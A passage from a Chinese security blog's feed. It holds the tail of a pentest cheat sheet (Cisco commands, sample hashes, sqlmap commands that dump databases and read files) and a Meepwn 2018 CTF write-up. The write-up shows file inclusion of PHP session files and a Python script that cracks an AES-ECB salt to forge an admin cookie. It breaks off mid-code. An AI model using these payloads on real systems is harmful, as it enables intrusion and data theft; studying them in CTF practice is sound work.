telnet 密码</td></tr><tr><td><code># show running-config</code></td><td>显示内存中的运行配置</td></tr><tr><td><code># show startup-config</code></td><td>显示启动配置</td></tr><tr><td><code># show version</code></td><td>显示cisco IOS 版本</td></tr><tr><td><code># show session</code></td><td>显示已打开的会话</td></tr><tr><td><code># show ip interface</code></td><td>显示网卡</td></tr><tr><td><code># show interface e0</code></td><td>显示网络接口细节</td></tr><tr><td><code># show ip route</code></td><td>显示路由</td></tr><tr><td><code># show access-lists</code></td><td>显示access lists</td></tr><tr><td><code># dir file systems</code></td><td>列出可用文件</td></tr><tr><td><code># dir all-filesystems</code></td><td>显示文件信息</td></tr><tr><td><code># dir /all</code></td><td>显示已删除文件</td></tr><tr><td><code># terminal length 0</code></td><td>取消终端输出长度限制</td></tr><tr><td><code># copy running-config tftp</code></td><td>复制运行配置到tftp 服务器</td></tr><tr><td><code># copy running-config startup-config</code></td><td>复制启动配置到运行配置</td></tr></tbody></table><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="哈希长度"><a href="#哈希长度" class="headerlink" title="哈希长度"></a>哈希长度</h3><table><thead><tr><th>哈希</th><th>长度</th></tr></thead><tbody><tr><td>MD5</td><td><code>16 Bytes</code></td></tr><tr><td>SHA-1</td><td><code>20 Bytes</code></td></tr><tr><td>SHA-256</td><td><code>32 Bytes</code></td></tr><tr><td>SHA-512</td><td><code>64 Bytes</code></td></tr></tbody></table><h3 id="哈希例子"><a href="#哈希例子" class="headerlink" title="哈希例子"></a>哈希例子</h3><p>可以直接使用  <strong>hash-identifier</strong>  命令判断哈希类型，但这里还是举些例子。</p><table><thead><tr><th>哈希</th><th>例子</th></tr></thead><tbody><tr><td>MD5 Hash Example</td><td><code>8743b52063cd84097a65d1633f5c74f5</code></td></tr><tr><td>MD5 $PASS:$SALT Example</td><td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td></tr><tr><td>MD5 $SALT:$PASS</td><td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td></tr><tr><td>SHA1 Hash Example</td><td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td></tr><tr><td>SHA1 $PASS:$SALT</td><td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td></tr><tr><td>SHA1 $SALT:$PASS</td><td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td></tr><tr><td>SHA-256</td><td><code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code></td></tr><tr><td>SHA-256 $PASS:$SALT</td><td><code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code></td></tr><tr><td>SHA-256 $SALT:$PASS</td><td><code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code></td></tr><tr><td>SHA-512</td><td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code></td></tr><tr><td>SHA-512 $PASS:$SALT</td><td><code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code></td></tr><tr><td>SHA-512 $SALT:$PASS</td><td><code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code></td></tr><tr><td>NTLM Hash Example</td><td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td></tr></tbody></table><h2 id="SQLMap例子"><a href="#SQLMap例子" class="headerlink" title="SQLMap例子"></a>SQLMap例子</h2><p>小型 SQLMap 速查表：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3</code></td><td>自动化sqlmap扫描</td></tr><tr><td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read=&quot;/var/www/blah.php&quot;</code></td><td>指定目标的sqlmap scan</td></tr><tr><td><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></td><td>使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库</td></tr><tr><td><code>sqlmap -o -u &quot;http://meh.com/form/&quot; --forms</code></td><td>检测可能存在注入点表单</td></tr><tr><td><code>sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms  -D database-name -T users --dump</code></td><td>导出指定数据库的user表并尝试破解哈希。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试工具备忘录&quot;&gt;&lt;a href=&quot;#渗透测试工具备忘录&quot; class=&quot;headerlink&quot; title=&quot;渗透测试工具备忘录&quot;&gt;&lt;/a&gt;渗透测试工具备忘录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;本文翻译自 &lt;a href=&quot;https://highon.coff
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含</title>
    <link href="https://findneo.github.io/180721MeepwnMaplStory/"/>
    <id>https://findneo.github.io/180721MeepwnMaplStory/</id>
    <published>2018-07-20T19:43:44.000Z</published>
    <updated>2019-01-25T23:21:37.032Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文首发 <a href="https://xz.aliyun.com/t/2463" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p><p>本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。</p><h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>打开 <a href="http://178.128.87.16" target="_blank" rel="noopener">http://178.128.87.16</a> 是一个登陆页面，注册账户后有四个页面，<code>HOME</code> 是欢迎页，<code>CHARACTER</code> 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， <code>SETTING</code> 页可以修改用户名和选择头像，<code>GAME</code> 页是一个Flash小游戏，和本题无关。</p><p>题目提供了源码下载，可以从 <a href="https://ctf.meepwn.team/attachments/web/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip" target="_blank" rel="noopener">这里</a> 或 <a href="https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip" target="_blank" rel="noopener">备用地址</a> 下载。</p><p><img src="1532072388162.png" alt="1532072388162"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><p><code>index.php</code> 文件中有如下语句，显然存在文件包含。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'page'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但所有 <code>GET</code> 和<code>POST</code> 提交的参数都会被删除掉敏感字符串，其中 <code>//</code> 、<code>(.+)</code> 和<code>`</code> `  是比较值得注意的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.</span></span><br><span class="line"><span class="comment">//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!</span></span><br><span class="line">$too_bad=<span class="string">"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is"</span>;</span><br><span class="line">$value = preg_replace($too_bad, str_repeat(<span class="string">"*"</span>,<span class="number">3</span>) ,$value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($value))&#123;mapl_die();&#125;</span><br><span class="line">$value=bad_words($value);</span><br><span class="line">$_GET[$key]=$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key2=&gt;$value2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (is_array($value2))&#123;mapl_die();&#125;</span><br><span class="line">$value2=bad_words($value2);</span><br><span class="line">$_POST[$key2]=$value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP使用PHPSESSID cookie值 存储会话标识，一般在<code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code> 文件里写有一些有特定意义的字符串，其中<code>&lt;PHPSESSID&gt;</code> 可在Cookie里找到。尝试读取SESSION文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5</span></span><br></pre></td></tr></table></figure><p><img src="1532088004024.png" alt="1532088004024"></p><p>其中是序列化后的<code>$_SESSION</code> 和明文的操作记录，这些内容在后面会大有用处。</p><h1 id="CPA猜解salt"><a href="#CPA猜解salt" class="headerlink" title="CPA猜解salt"></a>CPA猜解salt</h1><h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><p>阅读<code>login.php</code> 并跟入相关文件，可以看到有多处用到<code>$salt</code> 变量，其地位非常关键。</p><p>首先是从单独的表<code>mapl_config</code> 中读出值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    $configRow=config_connect($conn);</span><br><span class="line">    $salt=$configRow[<span class="string">'mapl_salt'</span>];</span><br><span class="line">    $key=$configRow[<span class="string">'mapl_key'</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function config_connect($conn)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $config=mysqli_query($conn,"SELECT * FROM mapl_config");</span></span><br><span class="line"><span class="comment">        return mysqli_fetch_array($config);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>如果登陆成功就将用户名和邮箱加盐加密存储的<code>$_SESSION</code> 变量里。并且将<code>admin</code> /<code>user</code> 字符串加盐加密存储在<code>$_COOKIE[&#39;_role&#39;]</code> 变量中，用以标识用户身份。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $count === <span class="number">1</span> &amp;&amp; $row[<span class="string">'userPass'</span>]===$password ) <span class="comment">//登陆成功</span></span><br><span class="line">&#123;</span><br><span class="line">$secure_email=encryptData($row[<span class="string">'userEmail'</span>],$salt,$key);</span><br><span class="line">$secure_name=encryptData($row[<span class="string">'userName'</span>],$salt,$key);</span><br><span class="line">$log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] Logged In'</span>;</span><br><span class="line">$_SESSION[<span class="string">'character_name'</span>] = $secure_name;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = $secure_email;</span><br><span class="line">    $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line"><span class="keyword">if</span> ($row[<span class="string">'userIsAdmin'</span>]===<span class="string">'1'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$data=<span class="string">'admin'</span>.$salt;</span><br><span class="line">$role=hash(<span class="string">'sha256'</span>, $data);</span><br><span class="line">setcookie(<span class="string">'_role'</span>,$role);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$data=<span class="string">'user'</span>.$salt;</span><br><span class="line">$role=hash(<span class="string">'sha256'</span>, $data);</span><br><span class="line">setcookie(<span class="string">'_role'</span>,$role);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">"Location: ?page=home.php"</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function encryptData($data,$salt,$key)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">            $encrypt=openssl_encrypt($data.$salt,"AES-128-ECB",$key);</span></span><br><span class="line"><span class="comment">            $raw=base64_decode($encrypt);</span></span><br><span class="line"><span class="comment">            $final=implode(unpack("H*", $raw));</span></span><br><span class="line"><span class="comment">            return $final;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="setting-php"><a href="#setting-php" class="headerlink" title="setting.php"></a>setting.php</h2><p>再查看<code>setting.php</code> ，这个文件实现了修改用户名页面的功能 。只要修改后的名字不长于22个字符，就使用<code>mysqli_real_escape_string</code> 处理并更新记录（避免SQL注入）。会被编码的字符有的 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($_POST[<span class="string">'name'</span>])&lt;=<span class="number">22</span>)&#123;</span><br><span class="line">    $name=mysqli_real_escape_string($conn,$_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $query=<span class="string">"UPDATE users SET userName='$name' WHERE userEmail='$mail'"</span>;</span><br><span class="line">    $res2=mysqli_query($conn,$query);</span><br><span class="line">    $userRow2=mysqli_fetch_array($res2);</span><br><span class="line">    $secure_name=encryptData($name,$salt,$key);</span><br><span class="line">    $_SESSION[<span class="string">'character_name'</span>] = $secure_name;</span><br><span class="line">    $log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] Change character name'</span>;</span><br><span class="line">    $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line">    header(<span class="string">"Refresh:0"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有加密操作用的是同一个<code>$salt</code> ，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了<code>AES-128-ECB</code> ，<code>ECB</code> 全称<code>Electronic Codebook</code> （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。</p><p>这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：</p><p>如果用户名是<code>findneo</code> 七个字节，<code>$salt</code> 是<code>xianzhi</code> 八个字节，那么加密过程就是把<code>findneoxianzhi</code> 共十五个字节作为一个分组去加密，缺一个字节按算法padding。</p><p>如果用户名是<code>hifindneo</code> 共九个字节，那么加密过程就是对<code>hifindne</code> 和<code>oxianzhi</code> 作为两个分组加密。</p><p>我们可以在<code>SETTING</code> 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>怎么攻击呢？比如用户名是<code>findneo</code> ，（我们还不知道<code>$salt</code> 是<code>xianzhi</code> ） ，那么加密的第一个明文分组是<code>findneox</code> ，记录下<code>$_SESSION[&#39;character_name&#39;]</code> 的前32个字节十六进制数，也就是密文的第一个分组。</p><p>然后依次改变用户名为<code>findneoa</code> 、<code>findneob</code> 、.etc，并记录密文第一个分组。直到用户名为<code>findneox</code> 时发现密文第一个分组与用户名为<code>findneo</code> 时的相同。根据ECB模式的特点，就能知道<code>$salt</code> 的第一个字节为<code>x</code> ，事实上也确实如此。</p><p>测试发现用户名长15个字符时，<code>$_SESSION[&#39;character_name&#39;]</code> 有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，<code>$_SESSION[&#39;character_name&#39;]</code> 有96字节，也就加盐加密后有48个字符。这说明<code>$salt</code> 长为16个字节。</p><p>然后就可以按照以上原理猜解<code>$salt</code> ，伪造<code>$_COOKIE[&#39;_role&#39;]</code> ，成为管理员。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'t9p07a1qt2plbcqp8tpkib4794'</span>,</span><br><span class="line">    <span class="comment"># _role='8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_sess</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(</span><br><span class="line">        url + <span class="string">"?page=/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>],</span><br><span class="line">        cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sess_character_name</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""read_sess():</span></span><br><span class="line"><span class="string">    character_name|s:64:"6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820";</span></span><br><span class="line"><span class="string">    user|s:64:"82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38";</span></span><br><span class="line"><span class="string">    action|s:40:"[12:04:21pm GMT+7] Change character name";</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    character_name = read_sess().split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">":"</span>)[<span class="number">-1</span>][<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> character_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url + <span class="string">"?page=home.php"</span>, cookies=cookie)</span><br><span class="line">    s = BeautifulSoup(r.content, <span class="string">'lxml'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.h2.get_text().split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_and_check</span><span class="params">(name)</span>:</span></span><br><span class="line">    change_name(name)</span><br><span class="line">    <span class="comment"># whoami()</span></span><br><span class="line">    <span class="keyword">return</span> get_sess_character_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">()</span>:</span></span><br><span class="line">    junk = <span class="string">'x'</span> * <span class="number">16</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    s = <span class="string">'ms_g00d_0ld_g4m3'</span> + string.printable</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        cmp = change_and_check(junk[:i])[:<span class="number">32</span>]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可</span></span><br><span class="line">            cmp = change_and_check(junk)[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> cmp == change_and_check(junk[:i] + salt + j)[:<span class="number">32</span>]:</span><br><span class="line">                salt += j</span><br><span class="line">                <span class="keyword">print</span> salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">salt = crack_salt()</span><br></pre></td></tr></table></figure><p>爆破得到<code>$salt</code> 为<code>ms_g00d_0ld_g4m3</code> ，然后计算出<code>admin</code> 用户的Cookie为<code>hashlib.sha256(&#39;admin&#39; + salt).hexdigest()</code>   也就是<code>_role=&#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#39;</code>。 </p><p><img src="1532066767366.png" alt="1532066767366"></p><p>可使用Fiddler的Filters功能设置请求头为<code>PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe</code> ，权限上升为ADMIN。</p><p><img src="1532072362986.png" alt="1532072362986"></p><h1 id="以Cookie为跳板的Session文件包含"><a href="#以Cookie为跳板的Session文件包含" class="headerlink" title="以Cookie为跳板的Session文件包含"></a>以Cookie为跳板的Session文件包含</h1><h2 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h2><p>注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有<code>admin.php</code>  中写入的内容存在可控变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_POST[<span class="string">'pet'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'pet'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">    $dir=<span class="string">'./upload/'</span>.md5($salt.$_POST[<span class="string">'email'</span>]).<span class="string">'/'</span>;</span><br><span class="line">    give_pet($dir,$_POST[<span class="string">'pet'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(check_available_pet($_POST[<span class="string">'pet'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] gave '</span>.$_POST[<span class="string">'pet'</span>].<span class="string">' to player '</span>.search_name_by_mail($conn,$_POST[<span class="string">'email'</span>]);</span><br><span class="line">        $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>search_name_by_mail($conn,$_POST[&#39;email&#39;])</code> 正是用户名，而这是可修改的。所以只要在<code>CHARACTER</code> 页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。</p><p>用户名修改有哪些限制？</p><p>首先是<code>文件包含</code> 小节提到的所有<code>GET</code> ，<code>POST</code> 参数都必须经过的黑名单过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span><span class="params">($value)</span></span>&#123;$too_bad=<span class="string">"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is"</span>;</span><br><span class="line">$value = preg_replace($too_bad, str_repeat(<span class="string">"*"</span>,<span class="number">3</span>) ,$value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># |\/\/|\(.+\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。</span></span><br></pre></td></tr></table></figure><p>然后是<code>setting.php</code> （代码见<code>CPA猜解salt</code> 小节）中要求的不大于22个字符。</p><h2 id="character-php"><a href="#character-php" class="headerlink" title="character.php"></a>character.php</h2><p>所有功能中唯一一个直接写文件的操作在和<code>CHARACTER</code> 页面，同样需经过黑名单过滤，并且要求小于20个字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'command'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'command'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_POST[<span class="string">'command'</span>])&gt;=<span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;strong&gt;Too Long&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        save_command($mail,$salt,$_POST[<span class="string">'command'</span>]);</span><br><span class="line">        